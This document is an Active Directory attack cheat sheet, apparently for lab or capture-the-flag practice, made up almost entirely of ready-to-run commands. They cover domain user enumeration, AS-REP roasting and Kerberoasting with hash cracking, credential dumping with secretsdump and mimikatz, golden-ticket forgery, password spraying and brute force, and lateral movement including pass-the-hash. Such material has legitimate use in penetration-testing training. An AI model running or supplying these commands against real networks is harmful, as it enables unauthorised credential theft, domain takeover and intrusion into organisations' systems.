
## AD Hack steps

#### 1. logged into in the network (foothold)
+ Find & exploit CVE to get shell on attacker machine.
+ Default credential on LDAP enumeration then use spray attack.
+ User enumeration and use [AS_REP (TGT)] attack to get user password.
#### 2. (Possibly) escalate privileges in the machine.
#### 3. Dump credentials (mimikatz) and/or obtain Kerberos tickets (TGS).
#### 4. Repeat steps above until you have administrative privileges in the Domain Controller.


+ NOTE [ Don't forget use enumeration tool winpeas.exe / linpeas.sh ] 




##  Get DOMAIN-Name & Device name 
```
$ crackmapexec smb [IP] 
$ crackmapexec smb 10.10.1.12
```
##  Users fuzzing & enumeration
+ Users fuzzing
```
$ kerbrute userenum  [wordlist]  -d [DC-name] --dc [Dc-ip]
$ kerbrute userenum  /usr/share/wordlists/dirb/others/names.txt  -d test.com --dc 10.10.1.12
```
+ Users enumeration using LDAP(Port 389)
```
$ ldapsearch -H ldap://[DC-IP] -x -b [namingContexts] "(objectClass=person)" | grep "sAMAccountName:" 
$ ldapsearch -H ldap://10.10.1.12 -x -b DC=test,DC=com "(objectClass=person)" | grep "sAMAccountName:" 

```
+ Users enumeration using enum4linux
```
# get all users in the domain
cmd> net user /domain
cmd> net user <username> /domain
```
```
$ enum4linux -v [DC-ip]
$ enum4linux -v 10.10.1.12
```
+ Users enumeration using rpcclient (Port 111)
```
$ rpcclient [DC-ip] -U "" -N 
$ enumdomusers
```
## Active Directory Attacks

### 1. Non-Pre-authentication AS_REP (TGT)
+ AS-REP Roasting is a technique that enables adversaries to steal the password hashes of user accounts that have Kerberos preauthentication disabled, which they can then attempt to crack offline and get user password.

```
$ impacket-GetNPUsers  [dc]/ -no-pass -u [usersname.txt]  -dc-ip [IP]  
$ impacket-GetNPUsers  test.com/ -no-pass -u users.txt  -dc-ip 10.10.1.12

# Use hashcat crack ticket
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
#### OR
```
$ kerburte --dc [ip] -d [domain_name] [user.txt] --downgrade
$ kerburte --dc 10.10.1.12 -d test.com user.txt  --downgrade

# Use hashcat crack ticket
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
```

### 2. Kerberoasting SPN (TGS)
+ A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with RC4 using the password hash of the service account that is assigned the requested SPN as the key


 #### A. Enumerate servicePrincipalNames (SPN)
 + using Linux (credentials required)
 ```
$ impacket-GetUserSPNs [Domain-name]/[user]:[pass] -dc-ip [IP]
$ impacket-GetUserSPNs test.com/user:pass123 -dc-ip 10.10.1.12
 
 ```
 + using windows attacker machine (with out credentials)
 ```
$ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
$ Get-NetUser -SPN | select serviceprincipalname
 
 ```
 #### B. Service request (get SPN hash TGS)
  ```
 # Run powershell
 $ Add-Type –AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList '[SPN]'
 $ Add-Type –AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList 'MSSQLSvc/sql01.exam.com:1433'
                
  ```
  ```
  # SPN hash saved on  windows memory  need mimikatz to extarc it
  $ kerberos::list /export
  
  # change format use kirbi2john
  $ kirbi2john SPN-mimikatz-output > hash.txt  
  $ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt     
  ```
  
  ### 3. Dump hashes
   + using Linux (credentials required)
  ```
  # To dumb SAM & logonpasswords 
  $ impacket-secretsdump [DC-name]/[user]:[pass]@[IP]
  $ impacket-secretsdump test.com/user:pass123$@10.10.1.12

  ```
  + using  mimikatz.exe  (with Administrator priv)
  ```
  $ mimikatz.exe
  
  # check to see if Mimikatz is running with system privileges
  $ privilege::debug 
  
  # output all of the clear text passwords stored on this computer
  $ sekurlsa::logonpasswords full
  
  # Dump local SAM 
  $ lsadump::sam

# Dump tickets that are stored in memory
  $ sekurlsa::tickets 
 ```   
   
 ### 4. Golden Tickets
 
  ```
  $ mimikatz.exe
  $ privilege::debug
  
  $ lsadump::lsa /inject /name:krbtgt
  
  
  # kerberos::golden /user: /domain: /sid: /krbtgt: /id:
  $ kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf 
/id:500

# Use Golden Tickets
$ misc::cmd

# Ues device name  to login with high priv
$ psexec.exe \\dc01 cmd.exe   
```
### 5. spray attack password

```
$ crackmapexec smb <IP> -u users.txt -p passwords.txt
```
```
# Password Spraying
$ kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.1.12] domain_users.txt Password123

# Brute-Force
$ kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.1.12] passwords.lst Allison
```
  
## Lateral movement
```
# winrm   port (5985)
$ evil-winrm -i <ip> -u <user> -p <pass> 


# smb port (445)
impacket-psexec <DC-name>/<user>:<pass>@<IP>
$ impacket-psexec test.com/Allison:pass123@10.10.1.12 


# RDP     port (3389)
rdesktop -u <user> -p <pass> <pass>
$ rdesktop -u Allison -p pass123 10.10.1.12
$ rdesktop -E -d test.com  -u Allison  -p pass123 10.10.1.12   #login use domain user 
```
+ Pass-the-Hash
```
$ evil-winrm -i <ip> -u <user> -p <NTLM hash> 

wmiexec.py -hashes '<NTLM hash>' -dc-ip <ip> <user>@<ip>
$ wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.1.12 administrator@10.10.1.12
```
 
 
